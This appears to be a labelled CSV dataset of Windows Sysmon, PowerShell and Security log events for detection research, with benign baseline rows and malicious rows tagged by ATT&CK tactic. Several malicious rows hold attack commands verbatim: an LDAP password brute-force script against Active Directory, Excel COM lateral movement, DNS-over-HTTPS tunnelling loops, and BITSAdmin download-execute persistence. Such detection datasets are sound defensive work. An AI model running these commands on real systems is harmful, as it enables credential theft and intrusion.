sample_id,label,source_type,attack_category,scenario_name,source_file,provider,channel,event_id,timestamp,computer,user,image,command_line,parent_image,target_object,destination_ip,destination_hostname,query_name,script_block_text,event_summary,label_reason
CYB499-051,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T09:45:13.4615778+00:00,Server002,SERVER002\lplui,C:\Windows\System32\ApplicationFrameHost.exe,C:\Windows\system32\ApplicationFrameHost.exe -Embedding,,,,,,,Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\ApplicationFrameHost.exe; cmd=C:\Windows\system32\ApplicationFrameHost.exe -Embedding; parent_cmd=-; user=SERVER002\lplui; detail=Process creation,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-052,Malicious,Sysmon,Execution,execute-powershell-script-via-word-dde,data/raw/malicious/execute-powershell-script-via-word-dde-json/T1559.002-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 07:38:11.6113119,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c start ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\DDE_Document.docx""",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c start ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\DDE_Document.docx""; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The command starts a DDE-enabled Word document, consistent with a document-based execution chain. Evidence: ""cmd.exe"" /c start ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\DDE_Document.docx"""
CYB499-053,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-17T15:54:21.4365943+00:00,Server002,SERVER002\lplui,C:\Windows\System32\backgroundTaskHost.exe,"""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXnme9zjyebb2xnyygh6q9ev6p5d234br2.mca",C:\Windows\System32\svchost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\backgroundTaskHost.exe; cmd=""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXnme9zjyebb2xnyygh6q9ev6p5d234br2.mca; parent=C:\Windows\System32\svchost.exe; parent_cmd=C:\Windows\system32\svchost.exe -k DcomLaunch -p; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-054,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:00.9418620,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Registry, Started, 	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
CYB499-055,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:54.5274122,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
CYB499-056,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.6852996,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Registry, Started, 	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
CYB499-057,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:20:51.9084709+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls ~/Desktop,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=96a16f6a-82d6-47c3-94cf-3c43c596ea27
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls ~/Desktop
	EngineVersion=5.1.19041.2673
	RunspaceId=01a6c362-9230-4884-9c55-04ffffd4098b
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls ~/Desktop; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-058,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:54.6029949,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
CYB499-059,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-16T20:17:32.8574805+00:00,Server002,SERVER002\lplui,C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe,"""C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe"" ""A3EF33AD-93E0-450F-AD3C-FC714CC60F2C"" ""5717FC2C-3512-4465-8531-E55439A39637"" ""6712"" ""C:\Program Files (x86)\Microsoft Office\root\Office16\POWERPNT.EXE"" ""PowerPointCombinedFloatieLreOnline.onnx""",C:\Program Files (x86)\Microsoft Office\root\Office16\POWERPNT.EXE,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe; cmd=""C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe"" ""A3EF33AD-93E0-450F-AD3C-FC714CC60F2C"" ""5717FC2C-3512-4465-8531-E554...; parent=C:\Program Files (x86)\Microsoft Office\root\Office16\POWERPNT.EXE; parent_cmd=""C:\Program Files (x86)\Microsoft Office\root\Office16\POWERPNT.EXE""; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-060,Malicious,Sysmon,Collection,collection_compressData_lockwithpw_exfiltrationwinrar,data/raw/malicious/collection_compressData_lockwithpw_exfiltrationwinrar_json/T1560.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 07:49:39.5695651,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%programfiles%%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar & dir",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%programfiles%%/WinRAR/Rar.exe"" a -hp""blue"" hello.r...; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The command line stages files and invokes WinRAR to create a password-protected archive. Evidence: ""cmd.exe"" /c mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%programfiles%%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar & dir"
CYB499-061,Malicious,Sysmon,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 15:11:09.7873192,Server002,SERVER002\admin_test,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" -UseBasicParsing).Content }}",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; cmd=""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" ...; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" -UseBasicParsing).Content }}"
CYB499-062,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4624,2025-04-29T17:33:24.2116907+00:00,Server002,WORKGROUP\SERVER002$,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,,,,,,,Security event 4624 from Microsoft-Windows-Security-Auditing on Server002; image=C:\Windows\System32\services.exe; cmd=C:\Windows\System32\services.exe; user=WORKGROUP\SERVER002$; detail=Successful logon,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-063,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,5061,2025-04-23T19:01:44.7319739+00:00,Server002,LOCAL SERVICE,,,,,,,,,Security event 5061 from Microsoft-Windows-Security-Auditing on Server002; user=LOCAL SERVICE,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-064,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5215770,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"FileSystem, Started, 	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
 Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
 exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)

$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
foreach ($password in $passwordList){
 $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
 $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
 try {
 Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
 $conn.bind()
 # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
 Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
 } catch {
 Write-Host $_.Exception.Message
 }
}
Write-Host ""End of bruteforce""}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
CYB499-065,Malicious,Sysmon,Collection,collection_compressData_lockwithpw_exfiltrationwinrar,data/raw/malicious/collection_compressData_lockwithpw_exfiltrationwinrar_json/T1560.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 07:49:38.5464235,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c if not exist ""%%programfiles%%/WinRAR/Rar.exe"" (exit /b 1)",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c if not exist ""%%programfiles%%/WinRAR/Rar.exe"" (exit /b 1); parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The command line stages files and invokes WinRAR to create a password-protected archive. Evidence: ""cmd.exe"" /c if not exist ""%%programfiles%%/WinRAR/Rar.exe"" (exit /b 1)"
CYB499-066,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T20:25:35.9506228+00:00,Server002,,,C:\Windows\system32\wsmprovhost.exe -Embedding,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c203603-13c6-456e-acf9-42ef47d79cc6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.19041.2673
	RunspaceId=4a699811-97ed-4b76-aabf-1c6918966788
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-067,Malicious,Sysmon,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-24 13:19:17.8185552,Server002,SERVER002\admin_test,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {,   Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\"""",   exit 1, }, [System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null, $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389), $passwordList = Get-Content -Path \""""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt\"""", foreach ($password in $passwordList){,   $credz = new-object System.Net.NetworkCredential(\""""$ENV:USERNAME\"""", $password, \""""$env:UserDnsDomain\""""),   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM),   try {,     Write-Host \"""" [-] Attempting ${password} on account $ENV:USERNAME.\"""",     $conn.bind(),     # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success,     Write-Host \"""" [!] $ENV:USERNAME:${password} are valid credentials!\"""",   } catch {,     Write-Host $_.Exception.Message,   }, }, Write-Host \""""End of bruteforce\""""}",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; cmd=""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {, Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\"""", exit 1, }, [System.R...; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: ""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {, Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\"""", exit 1, }, [System.Reflection.Assembly]::LoadWithPartialName..."
CYB499-068,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T09:38:51.6834772+00:00,Server002,SERVER002\lplui,C:\Windows\System32\BackgroundTransferHost.exe,"""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\BackgroundTransferHost.exe; cmd=""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1; parent_cmd=-; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-069,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,400,2024-10-21 11:25:01.3198313,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=5.1.19041.5007
	RunspaceId=bbf1a6fb-f587-4c21-9b3b-0c34e2768fa2
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
CYB499-070,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4798,2025-04-29T17:28:15.8564877+00:00,Server002,WORKGROUP\SERVER002$ (S-1-5-18),,,,,,,,,Security event 4798 from Microsoft-Windows-Security-Auditing on Server002; user=WORKGROUP\SERVER002$ (S-1-5-18); detail=A user's local group membership was enumerated,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-071,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-13T17:14:21.0779885+00:00,Server002,,,"powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;",,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.4894
	HostId=39be62ba-d580-4a17-a538-654dae9dd03c
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;
	EngineVersion=5.1.19041.4894
	RunspaceId=09e2ed45-7c24-46bc-84e5-54bdb75d6960
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; i...; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-072,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5122741,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Alias, Started, 	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
 Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
 exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)

$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
foreach ($password in $passwordList){
 $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
 $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
 try {
 Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
 $conn.bind()
 # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
 Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
 } catch {
 Write-Host $_.Exception.Message
 }
}
Write-Host ""End of bruteforce""}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
